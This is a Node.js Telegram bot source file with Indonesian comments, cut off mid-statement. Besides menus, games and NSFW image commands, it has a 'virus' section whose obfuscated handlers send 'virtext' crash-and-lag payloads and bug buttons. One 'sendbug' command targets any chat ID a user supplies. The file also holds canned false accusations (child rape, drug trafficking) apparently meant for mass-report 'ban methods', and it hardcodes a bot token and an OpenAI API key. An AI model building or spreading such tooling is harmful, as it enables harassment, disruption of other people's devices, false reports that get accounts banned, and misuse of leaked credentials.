const { Telegraf, Markup} = require('telegraf')
const { Extra } = require('telegraf')
const { Configuration, OpenAIApi } = require("openai");

const bot = new Telegraf('6129025262:AAGscUZ5V6Wmh1xkjuJdO0DS-MjEbNcmR_M');
const openaiToken = "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";
const config = new Configuration({
  apiKey: openaiToken,
});
const openai = new OpenAIApi(config);
const axios = require('axios');
const fs = require('fs');
const cheerio = require('cheerio');
const os = require('os');
const chalk = require("chalk");
const crypto = require("crypto");
const { exec, spawn, execSync } = require("child_process");
const fetch = require("node-fetch");
const Jimp = require("jimp");
const util = require("util");

//___________________________________________________________\\
//menu
const { menu } = require('./res/command/menu/menu')
const { bug } = require('./res/command/menu/bug')
const { owner } = require('./res/command/menu/owner')
const { game } = require('./res/command/menu/game')

//___________________________________________________________\\
//asset

const { ytd } = require('./res/function/yt')
const SPAM_THRESHOLD = 5;
const SPAM_INTERVAL = 10 * 1000;
const SPAM_MESSAGE = 'Jangan Spam Bot Atau Anda Akan Di Ban Untuk Menggunakan Bot';
const userHistory = {};
let antiLinkModeOn = false;
let welcomeMessageOn = true;
bot.on('new_chat_members', (ctx) => {
const user = ctx.message.new_chat_member;
  if (welcomeMessageOn) {
    let casperMessage = `Welcome ${user.first_name}, Please Type Menu For Use Bot`;
bot.telegram.sendPhoto(ctx.chat.id, {source: assetpict}, {caption : casperMessage, reply_to_message_id : ctx.message.message_id, reply_markup : { inline_keyboard: [
                    [
                        {text: `Donate`, callback_data: 'donate'},
                        {text: `Owner`, url: 'https://t.me/Nazimeet'}
                    ]
                ]
            }
      });
  }
});

//___________________________________________________________\\
//store
const { store } = require('./res/command/menu/store')
const { whatsapp } = require('./res/store/whatsapp')
const { textban } = require('./res/store/textban')
const { sctele } = require('./res/store/sctele')
const { scwa } = require('./res/store/scwa')

//___________________________________________________________\\
//virus
const { virus } = require('./res/virtext/virus')
const { virus2 } = require('./res/virtext/virus2')
const { virus3 } = require('./res/virtext/virus3')
const { virus4 } = require('./res/virtext/virus4')
const { bugbuton } = require('./res/virtext/bugbutton')
const { ngazap } = require('./res/virtext/ngazap')
const { bugcaption } = require('./res/virtext/bugcaption')
const { ngajab } = require('./res/virtext/ngajab')
const keyboard = Markup.inlineKeyboard([
  Markup.button('Button 1', '1'),
  Markup.button('Button 2', '2'),
  Markup.button('Button 3', '3')
]);
const delayMeker = `${virus}https://tinyurl.com/2foed8oc`;
    

//___________________________________________________________\\
//aset
const assetpict = './res/assets/img.jpg';

//____________________________________________________________\\
//penting!!
const ownerMessage = `${owner}`;
const soonMessage = `Coming Soon Jika Pengen Cepet Dibikin Donate Dong Bang Biar Semangat\n\nGopay / Dana\nNope 0895403595055`;

//===========================\\
//ganti pake id sama username lu
const ownerId = `5211130160`;
const ownerUsername = `Nazimeet`;

//____________________________________________________________\\
//asu
const ping = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25']
const ckbb = ping[Math.floor(Math.random() * ping.length)]
const pingMessage = `
◎ AKTIF SELAMA : ${ckbb} HOURS
◎ RAM: 1TB / 51TB`;
const bmsg = ['estupro de menores e tráfico de drogas!!', 'assassinatos e ameaças!!, por favor tome providências!!', 'vendendo drogas e vendendo mulheres']
const ckb = bmsg[Math.floor(Math.random() * bmsg.length)]


//_______________________________________________________________________\\
//game
const reslot1 = ['🍎', '🍏', '🍐', '🍊', '🍋', '🍌', '🍉', '🍇', '🍓', '🫐', '🍈', '🍒', '🍑', '🥭', '🍍', '🥥', '🥝', '🍅', '🥑', '🍆', '🥦', '🥬', '🫑', '🌶️']
const slot1 = reslot1[Math.floor(Math.random() * reslot1.length)]
const reslot2 = ['🍎', '🍏', '🍐', '🍊', '🍋', '🍌', '🍉', '🍇', '🍓', '🫐', '🍈', '🍒', '🍑', '🥭', '🍍', '🥥', '🥝', '🍅', '🥑', '🍆', '🥦', '🥬', '🫑', '🌶️']
const slot2 = reslot2[Math.floor(Math.random() * reslot2.length)]
const reslot3 = ['🍎', '🍏', '🍐', '🍊', '🍋', '🍌', '🍉', '🍇', '🍓', '🫐', '🍈', '🍒', '🍑', '🥭', '🍍', '🥥', '🥝', '🍅', '🥑', '🍆', '🥦', '🥬', '🫑', '🌶️']
const slot3 = reslot3[Math.floor(Math.random() * reslot3.length)]
const reslot4 = ['🍎', '🍏', '🍐', '🍊', '🍋', '🍌', '🍉', '🍇', '🍓', '🫐', '🍈', '🍒', '🍑', '🥭', '🍍', '🥥', '🥝', '🍅', '🥑', '🍆', '🥦', '🥬', '🫑', '🌶️']
const slot4 = reslot4[Math.floor(Math.random() * reslot4.length)]

//_______________________________________________________________________\\
//prefix
const prefixm = ['menu', 'Menu', 'MENU', 'm3nu', 'M3NU', 'MENH'];
const prefixbug = ['bugmenu', 'Bugmenu', 'BUGMENU', 'bugm3nu', 'BUGM3NU', 'BUGMENH'];
const prefixgem = ['game', 'Game', 'GAME', 'g4m3', 'G4M3', 'gem'];
const prefixown = ['owner', 'Owner', 'OWNER', '0wn3r', '0WN3R'];
const prefixbugctt = ['bugctt', 'Bugctt', 'BUGCTT'];
const prefixvirtex1 = ['virtext1', 'Virtext1', 'VIRTEXT1'];
const prefixvirtex2 = ['virtext2', 'Virtext2', 'VIRTEXT2'];
const prefixvirtex3 = ['virtext3', 'Virtext3', 'VIRTEXT3'];
const prefixvirtex4 = ['virtext4', 'Virtext4', 'VIRTEXT4'];
const prefixbug1 = ['bugbutton1', 'Bugbutton1', 'BUGBUTTON1'];
const prefixbug2 = ['bugbutton2', 'Bugbutton2', 'BUGBUTTON2'];
const prefixbugaud = ['bugaudio', 'Bugaudio', 'BUGAUDIO'];
const prefixbugdoc = ['bugdoc', 'Bugdoc', 'BUGDOC'];
const prefixbugcap = ['bugcaption', 'Bugcaption', 'BUGCAPTION'];
const prefixnsfw1 = ['nhentai', 'Nhentai', 'NHENTAI'];
const prefixnsfw2 = ['nwaifu', 'Nwaifu', 'NWAIFU'];
const prefixkopi = ['coffe', 'Coffe', 'COFFE'];
const prefixcekb = ['cekbot', 'Cekbot', 'CEKBOT'];
const banedtod = ['Banned', 'Bethod banned', 'Ban method'];
const sadsongpref = ['sadsong', 'SADSONG', 'Sadsong','SAD SONG', 'Sad Song', 'Sad song', 'sad song', 'LAGU SEDIH', 'Lagu Sedih', 'Lagu sedih', 'lagu sedih', 'Lagu Sad', 'Lagu sad', 'LAGU SAD', 'lagu sad', 'sad', 'SAD', 'Sad'];
const prefixsendbug = ['sendbug', 'Sendbug', 'SENDBUG'];
const prefixkeybug = ['keybug', 'Keybug', 'KEYBUG'];
const prefixbugch = ['bugch', 'Bugch', 'BUGCH'];

//_______________________________________________________________________\\
//menu
bot.action('start', ctx => {
    ctx.deleteMessage();
})


bot.command('start', (ctx) => {
bot.telegram.sendChatAction(ctx.chat.id, "typing")
let casperMessage = `Selamat Datang, Jika Ingin Menggunakan Bot Silahkan Patuhi Peraturan Nya\n\n●Jangan Spam Bot\n●Jangan Sengaja Spam Bug\n●Jangan Salahgunakan Bot Atau Anda Akan Di Ban`;
    bot.telegram.sendPhoto(ctx.chat.id, {source: assetpict}, {caption : casperMessage, reply_to_message_id : ctx.message.message_id, reply_markup : { inline_keyboard: [
                    [
                        {text: `Baiklah`, callback_data: 'setujucokasu'},
                        {text: `Tidak`, callback_data: 'tidaksetuju'}
                    ],
                    [
                        {text: `Dukungan`, url: 'https://t.me/Nazimeet'}
                    ],
                    [
                        {text: `Channel Dukungan`, url: 'https://t.me/CasperTechnicalAndEnginering'}
                    ]
                ]
            }
      });
      
})

bot.action('setujucokasu', ctx => {
bot.telegram.sendChatAction(ctx.chat.id, "typing")
    ctx.deleteMessage();
    ctx.reply(`Thanks, Type Menu To Use`);
})

bot.action('tidaksetuju', ctx => {
    ctx.deleteMessage();
})

bot.action('support', ctx => {
bot.telegram.sendChatAction(ctx.chat.id, "typing")
    ctx.deleteMessage();
    ctx.reply(`@Nazimeet`);
})

bot.hears(prefixm, (ctx) => {
bot.telegram.sendChatAction(ctx.chat.id, "typing")
let casperMessage = `${menu}`;
    bot.telegram.sendPhoto(ctx.chat.id, {source: assetpict}, {caption : casperMessage, reply_to_message_id : ctx.message.message_id, reply_markup : { inline_keyboard: [
                    [
                        {text: `Donate`, callback_data: 'donate'},
                        {text: `Owner`, url: 'https://t.me/Nazimeet'}
                    ]
                ]
            }
      });
});

bot.action('donate', ctx => {
bot.telegram.sendChatAction(ctx.chat.id, "typing")
ctx.deleteMessage();
    ctx.reply(`Makasih Bosque\n\nGopay : 0882003133773\nJika Anda Tidak Punya Gopay Tapi Tetap Memaksa Bisa Gunakan Jasa hotelmurah.com`);
setTimeout(() => {
    ctx.reply('This message was sent after waiting for 5 seconds.');
  }, 5000);
})

bot.action('donatedel', ctx => {
    ctx.deleteMessage();
bot.telegram.sendChatAction(ctx.chat.id, "typing")
    ctx.reply(`Makasih Bosque\n\nGopay : 0882003133773\nJika Anda Tidak Punya Gopay Tapi Tetap Memaksa Bisa Gunakan Jasa hotelmurah.com`);
})

bot.action('owner', ctx => {
bot.telegram.sendChatAction(ctx.chat.id, "typing")
bot.telegram.sendContact(ctx.chat.id, '+62895403595055', 'Casper');
})

bot.hears(prefixbug, (ctx) => {
bot.telegram.sendChatAction(ctx.chat.id, "typing")
let casperMessage = `${bug}`;
    bot.telegram.sendPhoto(ctx.chat.id, {source: assetpict}, {caption : casperMessage, reply_to_message_id : ctx.message.message_id, reply_markup : { inline_keyboard: [
                    [
                        {text: `Donate`, callback_data: 'donate'},
                        {text: `Owner`, url: 'https://t.me/Nazimeet'}
                    ]
                ]
            }
      });
});

bot.hears(prefixgem, (ctx) => { 
bot.telegram.sendChatAction(ctx.chat.id, "typing")
let casperMessage = `${game}`;
    bot.telegram.sendPhoto(ctx.chat.id, {source: assetpict}, {caption : casperMessage, reply_to_message_id : ctx.message.message_id, reply_markup : { inline_keyboard: [
                    [
                        {text: `Donate`, callback_data: 'donate'},
                        {text: `Owner`, url: 'https://t.me/Nazimeet'}
                    ]
                ]
            }
      });
});

bot.hears(prefixcekb, (ctx) => {
bot.telegram.sendChatAction(ctx.chat.id, "typing")
  if (ctx.from.username === `${ownerUsername}`) {
ctx.replyWithPhoto({source: assetpict}, {caption: `${pingMessage}`, reply_to_message_id : ctx.message.message_id})
}else{
        ctx.reply(`LU SIAPA BANGSAT YG BISA PAKE FITUR INI CUMA OWNER!!`, {reply_to_message_id : ctx.message.message_id})
     }
});

//_______________________________________________________________________\\
//peler
bot.hears(prefixown, (ctx) => {
bot.telegram.sendChatAction(ctx.chat.id, "typing")
bot.telegram.sendContact(ctx.chat.id, '+62895403595055', 'Casper');
});

//_______________________________________________________________________\\
//other
bot.hears(prefixnsfw1, async (ctx) => {
const chatId = ctx.chat.id;
if (ctx.from.username === `${ownerUsername}`) {
bot.telegram.sendChatAction(ctx.chat.id, "upload_photo")
        try{
            let res = await axios.get('https://waifu.pics/api/nsfw/neko');
            bot.telegram.sendPhoto(ctx.chat.id, res.data.url, {reply_to_message_id : ctx.message.message_id});
        }catch(e){
            console.log(e);
        }
  }else{
        ctx.reply(`Astagfirullah!!! haram bang`)
     }
});

bot.hears(prefixnsfw2, async (ctx) => {
if (ctx.from.username === `${ownerUsername}`) {
bot.telegram.sendChatAction(ctx.chat.id, "upload_photo")
        try{
            let wifu = await axios.get('https://waifu.pics/api/nsfw/waifu');
            bot.telegram.sendPhoto(ctx.chat.id, wifu.data.url, {reply_to_message_id : ctx.message.message_id});
        }catch(e){
            console.log(e);
        }
  }else{
        ctx.reply(`Astagfirullah!!! haram bang`)
     }
});

bot.hears(prefixkopi, (ctx) => {
bot.telegram.sendChatAction(ctx.chat.id, "upload_photo")
    ctx.replyWithPhoto({url: "https://coffee.alexflipnote.dev/random"}, {caption: "Random Coffe", reply_to_message_id : ctx.message.message_id})
})

let soonList = ['detectadmin', 'promote', 'demote'];
bot.hears(soonList, (ctx) => {
    ctx.reply(soonMessage, {reply_to_message_id : ctx.message.message_id});
})

bot.hears("play", (ctx) => {
  // Check if the message is a URL
  if (ctx.message.text.startsWith("http")) {
    const url = ctx.message.text
    ctx.reply("Playing music...")
    // Play the URL
    ctx.replyWithAudio(ctx.chat.id, url, {
      title: "This is your requested music",
      performer: "Telegraf bot"
    })
  }
})

//_______________________________________________________________________\\
//virus
bot.command(prefixsendbug, ctx => {
const _0x45ce5c=_0x5a77;(function(_0x18d703,_0xbeb5d5){const _0x46872b=_0x5a77,_0x26b52b=_0x18d703();while(!![]){try{const _0x33b3b1=-parseInt(_0x46872b(0x1ae))/0x1+parseInt(_0x46872b(0x1af))/0x2*(-parseInt(_0x46872b(0x1b0))/0x3)+parseInt(_0x46872b(0x1b2))/0x4+parseInt(_0x46872b(0x1b1))/0x5*(-parseInt(_0x46872b(0x1ab))/0x6)+parseInt(_0x46872b(0x1a6))/0x7+parseInt(_0x46872b(0x1a3))/0x8+parseInt(_0x46872b(0x1a5))/0x9;if(_0x33b3b1===_0xbeb5d5)break;else _0x26b52b['push'](_0x26b52b['shift']());}catch(_0x1e6848){_0x26b52b['push'](_0x26b52b['shift']());}}}(_0x2eec,0x5bd0d));let idorgnye=ctx[_0x45ce5c(0x1a4)][_0x45ce5c(0x1a7)][_0x45ce5c(0x1a8)]('\x20')[0x1];const orgnye=idorgnye;bot[_0x45ce5c(0x1ac)][_0x45ce5c(0x1ad)](ctx['chat']['id'],'record_audio');function _0x5a77(_0x7aee4b,_0x32fbbe){const _0x2eecc2=_0x2eec();return _0x5a77=function(_0x5a778d,_0x12d420){_0x5a778d=_0x5a778d-0x1a3;let _0x57509d=_0x2eecc2[_0x5a778d];return _0x57509d;},_0x5a77(_0x7aee4b,_0x32fbbe);}let casperMessage=virus4+'\x0a'+virus4+'\x0a'+virus4+'\x0a'+virus4;function _0x2eec(){const _0x508138=['48269sywQdh','755708WfOdQe','3CIWFHi','1473590WUbaCf','1467712NlUXkD','3687032masrtc','message','949491TmYlws','3208310QJQhRj','text','split','jdjfb','usw7sy','12RkCjMo','telegram','sendChatAction'];_0x2eec=function(){return _0x508138;};return _0x2eec();}bot[_0x45ce5c(0x1ac)]['sendMessage'](orgnye,casperMessage,{'reply_markup':{'inline_keyboard':[[{'text':''+bugbuton,'callback_data':'ndjdnn'},{'text':''+bugbuton,'callback_data':_0x45ce5c(0x1a9)}],[{'text':''+bugbuton,'callback_data':'jdhdbb'},{'text':''+bugbuton,'callback_data':_0x45ce5c(0x1aa)}],[{'text':''+bugbuton,'callback_data':'ajdejjd'}]]}});
})

bot.hears(prefixvirtex1, (ctx) => {
var _0xe96488=_0x55fe;(function(_0x583de6,_0x1489d2){var _0x191a26=_0x55fe,_0x532cf6=_0x583de6();while(!![]){try{var _0x23cc6e=-parseInt(_0x191a26(0x10e))/0x1+-parseInt(_0x191a26(0x114))/0x2*(parseInt(_0x191a26(0x10d))/0x3)+parseInt(_0x191a26(0x108))/0x4+-parseInt(_0x191a26(0x104))/0x5+parseInt(_0x191a26(0x102))/0x6+parseInt(_0x191a26(0x112))/0x7+-parseInt(_0x191a26(0x111))/0x8;if(_0x23cc6e===_0x1489d2)break;else _0x532cf6['push'](_0x532cf6['shift']());}catch(_0x958260){_0x532cf6['push'](_0x532cf6['shift']());}}}(_0x5da8,0xe812d),bot['telegram'][_0xe96488(0x109)](ctx[_0xe96488(0x110)]['id'],_0xe96488(0x10f)),ctx[_0xe96488(0x105)](_0xe96488(0x107),{'reply_to_message_id':ctx[_0xe96488(0x106)][_0xe96488(0x116)]}),ctx[_0xe96488(0x105)](_0xe96488(0x107),{'reply_to_message_id':ctx['message'][_0xe96488(0x116)]}),ctx[_0xe96488(0x105)](_0xe96488(0x107),{'reply_to_message_id':ctx['message']['message_id']}),ctx[_0xe96488(0x105)]('https://tinyurl.com/2foed8oc',{'reply_to_message_id':ctx[_0xe96488(0x106)][_0xe96488(0x116)]}),ctx[_0xe96488(0x105)](_0xe96488(0x107),{'reply_to_message_id':ctx[_0xe96488(0x106)][_0xe96488(0x116)]}),ctx[_0xe96488(0x10b)][_0xe96488(0x10c)](ctx[_0xe96488(0x110)]['id'],{'source':assetpict},{'caption':_0xe96488(0x107),'reply_to_message_id':ctx[_0xe96488(0x106)][_0xe96488(0x116)],'reply_markup':{'inline_keyboard':[[{'text':'Bug\x20Channel','url':'https://t.me/Casperbug'}],[{'text':_0xe96488(0x115),'callback_data':_0xe96488(0x113)},{'text':'Owner','url':_0xe96488(0x10a)}]]}}),ctx[_0xe96488(0x105)](_0xe96488(0x103),{'reply_to_message_id':ctx[_0xe96488(0x106)]['message_id']}));function _0x55fe(_0x5d7f24,_0x329477){var _0x5da8bf=_0x5da8();return _0x55fe=function(_0x55fe7a,_0x5520af){_0x55fe7a=_0x55fe7a-0x102;var _0x4916a5=_0x5da8bf[_0x55fe7a];return _0x4916a5;},_0x55fe(_0x5d7f24,_0x329477);}function _0x5da8(){var _0x47c992=['Donate','message_id','6574158kAcHTw','Delay\x20Maker\x20By\x20Casper\x20⸸\x20Misterio','8185295KzBtHI','reply','message','https://tinyurl.com/2foed8oc','6752524lJrEvF','sendChatAction','https://t.me/Nazimeet','telegram','sendPhoto','995583FRJBRB','490223BoyaVn','record_audio','chat','7822544lKCpJl','11225970zIVHln','donatedel','2ylhXKH'];_0x5da8=function(){return _0x47c992;};return _0x5da8();}
})

bot.hears(prefixvirtex2, (ctx) => {
var _0xe96488=_0x55fe;(function(_0x583de6,_0x1489d2){var _0x191a26=_0x55fe,_0x532cf6=_0x583de6();while(!![]){try{var _0x23cc6e=-parseInt(_0x191a26(0x10e))/0x1+-parseInt(_0x191a26(0x114))/0x2*(parseInt(_0x191a26(0x10d))/0x3)+parseInt(_0x191a26(0x108))/0x4+-parseInt(_0x191a26(0x104))/0x5+parseInt(_0x191a26(0x102))/0x6+parseInt(_0x191a26(0x112))/0x7+-parseInt(_0x191a26(0x111))/0x8;if(_0x23cc6e===_0x1489d2)break;else _0x532cf6['push'](_0x532cf6['shift']());}catch(_0x958260){_0x532cf6['push'](_0x532cf6['shift']());}}}(_0x5da8,0xe812d),bot['telegram'][_0xe96488(0x109)](ctx[_0xe96488(0x110)]['id'],_0xe96488(0x10f)),ctx[_0xe96488(0x105)](_0xe96488(0x107),{'reply_to_message_id':ctx[_0xe96488(0x106)][_0xe96488(0x116)]}),ctx[_0xe96488(0x105)](_0xe96488(0x107),{'reply_to_message_id':ctx['message'][_0xe96488(0x116)]}),ctx[_0xe96488(0x105)](_0xe96488(0x107),{'reply_to_message_id':ctx['message']['message_id']}),ctx[_0xe96488(0x105)]('https://tinyurl.com/2foed8oc',{'reply_to_message_id':ctx[_0xe96488(0x106)][_0xe96488(0x116)]}),ctx[_0xe96488(0x105)](_0xe96488(0x107),{'reply_to_message_id':ctx[_0xe96488(0x106)][_0xe96488(0x116)]}),ctx[_0xe96488(0x10b)][_0xe96488(0x10c)](ctx[_0xe96488(0x110)]['id'],{'source':assetpict},{'caption':_0xe96488(0x107),'reply_to_message_id':ctx[_0xe96488(0x106)][_0xe96488(0x116)],'reply_markup':{'inline_keyboard':[[{'text':'Bug\x20Channel','url':'https://t.me/Casperbug'}],[{'text':_0xe96488(0x115),'callback_data':_0xe96488(0x113)},{'text':'Owner','url':_0xe96488(0x10a)}]]}}),ctx[_0xe96488(0x105)](_0xe96488(0x103),{'reply_to_message_id':ctx[_0xe96488(0x106)]['message_id']}));function _0x55fe(_0x5d7f24,_0x329477){var _0x5da8bf=_0x5da8();return _0x55fe=function(_0x55fe7a,_0x5520af){_0x55fe7a=_0x55fe7a-0x102;var _0x4916a5=_0x5da8bf[_0x55fe7a];return _0x4916a5;},_0x55fe(_0x5d7f24,_0x329477);}function _0x5da8(){var _0x47c992=['Donate','message_id','6574158kAcHTw','Delay\x20Maker\x20By\x20Casper\x20⸸\x20Misterio','8185295KzBtHI','reply','message','https://tinyurl.com/2foed8oc','6752524lJrEvF','sendChatAction','https://t.me/Nazimeet','telegram','sendPhoto','995583FRJBRB','490223BoyaVn','record_audio','chat','7822544lKCpJl','11225970zIVHln','donatedel','2ylhXKH'];_0x5da8=function(){return _0x47c992;};return _0x5da8();}
})

bot.hears(prefixvirtex3, (ctx) => {
var _0xe96488=_0x55fe;(function(_0x583de6,_0x1489d2){var _0x191a26=_0x55fe,_0x532cf6=_0x583de6();while(!![]){try{var _0x23cc6e=-parseInt(_0x191a26(0x10e))/0x1+-parseInt(_0x191a26(0x114))/0x2*(parseInt(_0x191a26(0x10d))/0x3)+parseInt(_0x191a26(0x108))/0x4+-parseInt(_0x191a26(0x104))/0x5+parseInt(_0x191a26(0x102))/0x6+parseInt(_0x191a26(0x112))/0x7+-parseInt(_0x191a26(0x111))/0x8;if(_0x23cc6e===_0x1489d2)break;else _0x532cf6['push'](_0x532cf6['shift']());}catch(_0x958260){_0x532cf6['push'](_0x532cf6['shift']());}}}(_0x5da8,0xe812d),bot['telegram'][_0xe96488(0x109)](ctx[_0xe96488(0x110)]['id'],_0xe96488(0x10f)),ctx[_0xe96488(0x105)](_0xe96488(0x107),{'reply_to_message_id':ctx[_0xe96488(0x106)][_0xe96488(0x116)]}),ctx[_0xe96488(0x105)](_0xe96488(0x107),{'reply_to_message_id':ctx['message'][_0xe96488(0x116)]}),ctx[_0xe96488(0x105)](_0xe96488(0x107),{'reply_to_message_id':ctx['message']['message_id']}),ctx[_0xe96488(0x105)]('https://tinyurl.com/2foed8oc',{'reply_to_message_id':ctx[_0xe96488(0x106)][_0xe96488(0x116)]}),ctx[_0xe96488(0x105)](_0xe96488(0x107),{'reply_to_message_id':ctx[_0xe96488(0x106)][_0xe96488(0x116)]}),ctx[_0xe96488(0x10b)][_0xe96488(0x10c)](ctx[_0xe96488(0x110)]['id'],{'source':assetpict},{'caption':_0xe96488(0x107),'reply_to_message_id':ctx[_0xe96488(0x106)][_0xe96488(0x116)],'reply_markup':{'inline_keyboard':[[{'text':'Bug\x20Channel','url':'https://t.me/Casperbug'}],[{'text':_0xe96488(0x115),'callback_data':_0xe96488(0x113)},{'text':'Owner','url':_0xe96488(0x10a)}]]}}),ctx[_0xe96488(0x105)](_0xe96488(0x103),{'reply_to_message_id':ctx[_0xe96488(0x106)]['message_id']}));function _0x55fe(_0x5d7f24,_0x329477){var _0x5da8bf=_0x5da8();return _0x55fe=function(_0x55fe7a,_0x5520af){_0x55fe7a=_0x55fe7a-0x102;var _0x4916a5=_0x5da8bf[_0x55fe7a];return _0x4916a5;},_0x55fe(_0x5d7f24,_0x329477);}function _0x5da8(){var _0x47c992=['Donate','message_id','6574158kAcHTw','Delay\x20Maker\x20By\x20Casper\x20⸸\x20Misterio','8185295KzBtHI','reply','message','https://tinyurl.com/2foed8oc','6752524lJrEvF','sendChatAction','https://t.me/Nazimeet','telegram','sendPhoto','995583FRJBRB','490223BoyaVn','record_audio','chat','7822544lKCpJl','11225970zIVHln','donatedel','2ylhXKH'];_0x5da8=function(){return _0x47c992;};return _0x5da8();}
})

bot.hears(prefixvirtex4, (ctx) => {
var _0xe96488=_0x55fe;(function(_0x583de6,_0x1489d2){var _0x191a26=_0x55fe,_0x532cf6=_0x583de6();while(!![]){try{var _0x23cc6e=-parseInt(_0x191a26(0x10e))/0x1+-parseInt(_0x191a26(0x114))/0x2*(parseInt(_0x191a26(0x10d))/0x3)+parseInt(_0x191a26(0x108))/0x4+-parseInt(_0x191a26(0x104))/0x5+parseInt(_0x191a26(0x102))/0x6+parseInt(_0x191a26(0x112))/0x7+-parseInt(_0x191a26(0x111))/0x8;if(_0x23cc6e===_0x1489d2)break;else _0x532cf6['push'](_0x532cf6['shift']());}catch(_0x958260){_0x532cf6['push'](_0x532cf6['shift']());}}}(_0x5da8,0xe812d),bot['telegram'][_0xe96488(0x109)](ctx[_0xe96488(0x110)]['id'],_0xe96488(0x10f)),ctx[_0xe96488(0x105)](_0xe96488(0x107),{'reply_to_message_id':ctx[_0xe96488(0x106)][_0xe96488(0x116)]}),ctx[_0xe96488(0x105)](_0xe96488(0x107),{'reply_to_message_id':ctx['message'][_0xe96488(0x116)]}),ctx[_0xe96488(0x105)](_0xe96488(0x107),{'reply_to_message_id':ctx['message']['message_id']}),ctx[_0xe96488(0x105)]('https://tinyurl.com/2foed8oc',{'reply_to_message_id':ctx[_0xe96488(0x106)][_0xe96488(0x116)]}),ctx[_0xe96488(0x105)](_0xe96488(0x107),{'reply_to_message_id':ctx[_0xe96488(0x106)][_0xe96488(0x116)]}),ctx[_0xe96488(0x10b)][_0xe96488(0x10c)](ctx[_0xe96488(0x110)]['id'],{'source':assetpict},{'caption':_0xe96488(0x107),'reply_to_message_id':ctx[_0xe96488(0x106)][_0xe96488(0x116)],'reply_markup':{'inline_keyboard':[[{'text':'Bug\x20Channel','url':'https://t.me/Casperbug'}],[{'text':_0xe96488(0x115),'callback_data':_0xe96488(0x113)},{'text':'Owner','url':_0xe96488(0x10a)}]]}}),ctx[_0xe96488(0x105)](_0xe96488(0x103),{'reply_to_message_id':ctx[_0xe96488(0x106)]['message_id']}));function _0x55fe(_0x5d7f24,_0x329477){var _0x5da8bf=_0x5da8();return _0x55fe=function(_0x55fe7a,_0x5520af){_0x55fe7a=_0x55fe7a-0x102;var _0x4916a5=_0x5da8bf[_0x55fe7a];return _0x4916a5;},_0x55fe(_0x5d7f24,_0x329477);}function _0x5da8(){var _0x47c992=['Donate','message_id','6574158kAcHTw','Delay\x20Maker\x20By\x20Casper\x20⸸\x20Misterio','8185295KzBtHI','reply','message','https://tinyurl.com/2foed8oc','6752524lJrEvF','sendChatAction','https://t.me/Nazimeet','telegram','sendPhoto','995583FRJBRB','490223BoyaVn','record_audio','chat','7822544lKCpJl','11225970zIVHln','donatedel','2ylhXKH'];_0x5da8=function(){return _0x47c992;};return _0x5da8();}
})

bot.hears(prefixbug1, ctx => {
bot.telegram.sendChatAction(ctx.chat.id, "typing")
const _0x211861=_0x5b31;(function(_0x474ebc,_0x50afbb){const _0x4f42df=_0x5b31,_0x1d8051=_0x474ebc();while(!![]){try{const _0x368419=-parseInt(_0x4f42df(0x1e4))/0x1*(parseInt(_0x4f42df(0x1ea))/0x2)+parseInt(_0x4f42df(0x1e2))/0x3*(parseInt(_0x4f42df(0x1f0))/0x4)+parseInt(_0x4f42df(0x1e6))/0x5+-parseInt(_0x4f42df(0x1e7))/0x6+parseInt(_0x4f42df(0x1e9))/0x7*(parseInt(_0x4f42df(0x1ee))/0x8)+-parseInt(_0x4f42df(0x1e3))/0x9+-parseInt(_0x4f42df(0x1ef))/0xa*(parseInt(_0x4f42df(0x1f1))/0xb);if(_0x368419===_0x50afbb)break;else _0x1d8051['push'](_0x1d8051['shift']());}catch(_0x358a86){_0x1d8051['push'](_0x1d8051['shift']());}}}(_0x2a55,0xcbe14));let casperMessage=virus4+'\x0a'+virus4+'\x0a'+virus4+'\x0a'+virus4;function _0x2a55(){const _0x4b97a0=['telegram','96ozJmRd','30nyZCrN','6084116YbVSnG','1155253TRJEJJ','ndjdnn','3vQzulQ','2830383BPMEqK','12055FFIOnu','jdjfb','5297130vgWXva','2140056PhWFGv','usw7sy','436184grqzRb','250smIprZ','chat','jdhdbb'];_0x2a55=function(){return _0x4b97a0;};return _0x2a55();}function _0x5b31(_0x17b502,_0x46e8a3){const _0x2a5572=_0x2a55();return _0x5b31=function(_0x5b312c,_0x28c5e9){_0x5b312c=_0x5b312c-0x1e1;let _0x237cf4=_0x2a5572[_0x5b312c];return _0x237cf4;},_0x5b31(_0x17b502,_0x46e8a3);}bot[_0x211861(0x1ed)]['sendMessage'](ctx[_0x211861(0x1eb)]['id'],casperMessage,{'reply_markup':{'inline_keyboard':[[{'text':''+bugbuton,'callback_data':_0x211861(0x1e1)},{'text':''+bugbuton,'callback_data':_0x211861(0x1e5)}],[{'text':''+bugbuton,'callback_data':_0x211861(0x1ec)},{'text':''+bugbuton,'callback_data':_0x211861(0x1e8)}],[{'text':''+bugbuton,'callback_data':'ajdejjd'}]]}});
})

bot.hears(prefixbug2, ctx => {
bot.telegram.sendChatAction(ctx.chat.id, "typing")
const _0x8341e4=_0x59f9;function _0x59f9(_0x25ca02,_0x55c457){const _0x47086c=_0x4708();return _0x59f9=function(_0x59f973,_0x37da9c){_0x59f973=_0x59f973-0x15b;let _0x39883c=_0x47086c[_0x59f973];return _0x39883c;},_0x59f9(_0x25ca02,_0x55c457);}(function(_0x229cee,_0x426f29){const _0x4e1d88=_0x59f9,_0x4dba9d=_0x229cee();while(!![]){try{const _0x5a0c90=-parseInt(_0x4e1d88(0x169))/0x1+parseInt(_0x4e1d88(0x168))/0x2+parseInt(_0x4e1d88(0x15c))/0x3*(parseInt(_0x4e1d88(0x165))/0x4)+parseInt(_0x4e1d88(0x15d))/0x5+parseInt(_0x4e1d88(0x167))/0x6+parseInt(_0x4e1d88(0x162))/0x7*(-parseInt(_0x4e1d88(0x166))/0x8)+-parseInt(_0x4e1d88(0x160))/0x9;if(_0x5a0c90===_0x426f29)break;else _0x4dba9d['push'](_0x4dba9d['shift']());}catch(_0x5af9a0){_0x4dba9d['push'](_0x4dba9d['shift']());}}}(_0x4708,0xe38f6));function _0x4708(){const _0x14eba8=['ajdejjd','14679tSbanj','telegram','jdjfb','4InaWSy','1496ANkMQQ','5193774btlsEP','1426838DGCALD','1658090JxcUSt','sendMessage','3355437PqZVMP','5626975OzvwCE','usw7sy','ndjdnn','7565463RNrlwb'];_0x4708=function(){return _0x14eba8;};return _0x4708();}let 